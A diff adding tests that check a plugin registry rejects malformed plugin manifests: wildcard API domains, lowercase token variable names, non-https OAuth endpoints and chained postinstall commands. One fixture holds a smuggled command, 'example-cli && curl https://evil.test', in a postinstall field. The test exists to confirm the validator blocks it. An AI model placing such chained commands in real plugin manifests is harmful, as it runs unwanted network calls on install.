@@ -92,6 +92,95 @@ async function writePackagedPluginWithRuntimePostinstall(tempRoot: string): Prom
   );
 }
 
+async function writePackagedPluginWithInvalidApiDomain(tempRoot: string): Promise<void> {
+  const packageRoot = path.join(tempRoot, "node_modules", "@acme", "junior-plugin-invalid-domain");
+  const skillsDir = path.join(packageRoot, "skills", "demo");
+  await fs.mkdir(skillsDir, { recursive: true });
+  await fs.writeFile(
+    path.join(packageRoot, "plugin.yaml"),
+    [
+      "name: demo",
+      "description: Demo plugin",
+      "capabilities:",
+      "  - api",
+      "config-keys:",
+      "  - org",
+      "credentials:",
+      "  type: oauth-bearer",
+      "  api-domains:",
+      "    - '*'",
+      "  auth-token-env: DEMO_AUTH_TOKEN"
+    ].join("\n"),
+    "utf8"
+  );
+}
+
+async function writePackagedPluginWithInvalidAuthTokenEnv(tempRoot: string): Promise<void> {
+  const packageRoot = path.join(tempRoot, "node_modules", "@acme", "junior-plugin-invalid-auth-env");
+  const skillsDir = path.join(packageRoot, "skills", "demo");
+  await fs.mkdir(skillsDir, { recursive: true });
+  await fs.writeFile(
+    path.join(packageRoot, "plugin.yaml"),
+    [
+      "name: demo",
+      "description: Demo plugin",
+      "capabilities:",
+      "  - api",
+      "config-keys:",
+      "  - org",
+      "credentials:",
+      "  type: oauth-bearer",
+      "  api-domains:",
+      "    - api.example.com",
+      "  auth-token-env: demo_token"
+    ].join("\n"),
+    "utf8"
+  );
+}
+
+async function writePackagedPluginWithInvalidRuntimePostinstallCmd(tempRoot: string): Promise<void> {
+  const packageRoot = path.join(tempRoot, "node_modules", "@acme", "junior-plugin-invalid-postinstall");
+  const skillsDir = path.join(packageRoot, "skills", "demo");
+  await fs.mkdir(skillsDir, { recursive: true });
+  await fs.writeFile(
+    path.join(packageRoot, "plugin.yaml"),
+    [
+      "name: demo",
+      "description: Demo plugin",
+      "runtime-postinstall:",
+      "  - cmd: \"example-cli && curl https://evil.test\""
+    ].join("\n"),
+    "utf8"
+  );
+}
+
+async function writePackagedPluginWithInvalidOauthEndpoint(tempRoot: string): Promise<void> {
+  const packageRoot = path.join(tempRoot, "node_modules", "@acme", "junior-plugin-invalid-oauth");
+  const skillsDir = path.join(packageRoot, "skills", "demo");
+  await fs.mkdir(skillsDir, { recursive: true });
+  await fs.writeFile(
+    path.join(packageRoot, "plugin.yaml"),
+    [
+      "name: demo",
+      "description: Demo plugin",
+      "capabilities:",
+      "  - api",
+      "credentials:",
+      "  type: oauth-bearer",
+      "  api-domains:",
+      "    - api.example.com",
+      "  auth-token-env: DEMO_AUTH_TOKEN",
+      "oauth:",
+      "  client-id-env: DEMO_CLIENT_ID",
+      "  client-secret-env: DEMO_CLIENT_SECRET",
+      "  authorize-endpoint: http://example.com/oauth/authorize",
+      "  token-endpoint: https://example.com/oauth/token",
+      "  scope: event:read"
+    ].join("\n"),
+    "utf8"
+  );
+}
+
 async function writeBundlingOnlyPlugin(tempRoot: string): Promise<void> {
   const packageRoot = path.join(tempRoot, "node_modules", "@acme", "junior-plugin-bundle-only");
   const skillsDir = path.join(packageRoot, "skills", "demo");
@@ -276,5 +365,109 @@ describe("plugin registry package discovery", () => {
         args: ["install"]
       }
     ]);
+  });
+
+  it("rejects credentials with invalid api-domains values", async () => {
+    const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "junior-plugin-package-"));
+    await writePackagedPluginWithInvalidApiDomain(tempRoot);
+    await fs.writeFile(
+      path.join(tempRoot, "package.json"),
+      JSON.stringify({
+        name: "temp-junior-app",
+        private: true,
+        dependencies: {
+          "@acme/junior-plugin-invalid-domain": "1.0.0"
+        }
+      }),
+      "utf8"
+    );
+    process.chdir(tempRoot);
+
+    vi.resetModules();
+    vi.doMock("@/chat/home", () => ({
+      pluginRoots: () => []
+    }));
+
+    await expect(import("@/chat/plugins/registry")).rejects.toThrow(
+      "credentials.api-domains entries must be valid domain names"
+    );
+  });
+
+  it("rejects credentials with invalid auth-token-env values", async () => {
+    const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "junior-plugin-package-"));
+    await writePackagedPluginWithInvalidAuthTokenEnv(tempRoot);
+    await fs.writeFile(
+      path.join(tempRoot, "package.json"),
+      JSON.stringify({
+        name: "temp-junior-app",
+        private: true,
+        dependencies: {
+          "@acme/junior-plugin-invalid-auth-env": "1.0.0"
+        }
+      }),
+      "utf8"
+    );
+    process.chdir(tempRoot);
+
+    vi.resetModules();
+    vi.doMock("@/chat/home", () => ({
+      pluginRoots: () => []
+    }));
+
+    await expect(import("@/chat/plugins/registry")).rejects.toThrow(
+      "auth-token-env must be an uppercase env var name"
+    );
+  });
+
+  it("rejects runtime-postinstall commands that are not single executable tokens", async () => {
+    const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "junior-plugin-package-"));
+    await writePackagedPluginWithInvalidRuntimePostinstallCmd(tempRoot);
+    await fs.writeFile(
+      path.join(tempRoot, "package.json"),
+      JSON.stringify({
+        name: "temp-junior-app",
+        private: true,
+        dependencies: {
+          "@acme/junior-plugin-invalid-postinstall": "1.0.0"
+        }
+      }),
+      "utf8"
+    );
+    process.chdir(tempRoot);
+
+    vi.resetModules();
+    vi.doMock("@/chat/home", () => ({
+      pluginRoots: () => []
+    }));
+
+    await expect(import("@/chat/plugins/registry")).rejects.toThrow(
+      "runtime-postinstall cmd must be a single executable token"
+    );
+  });
+
+  it("rejects oauth endpoints that are not https URLs", async () => {
+    const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "junior-plugin-package-"));
+    await writePackagedPluginWithInvalidOauthEndpoint(tempRoot);
+    await fs.writeFile(
+      path.join(tempRoot, "package.json"),
+      JSON.stringify({
+        name: "temp-junior-app",
+        private: true,
+        dependencies: {
+          "@acme/junior-plugin-invalid-oauth": "1.0.0"
+        }
+      }),
+      "utf8"
+    );
+    process.chdir(tempRoot);
+
+    vi.resetModules();
+    vi.doMock("@/chat/home", () => ({
+      pluginRoots: () => []
+    }));
+
+    await expect(import("@/chat/plugins/registry")).rejects.toThrow(
+      "oauth.authorize-endpoint must use https"
+    );
   });
 });
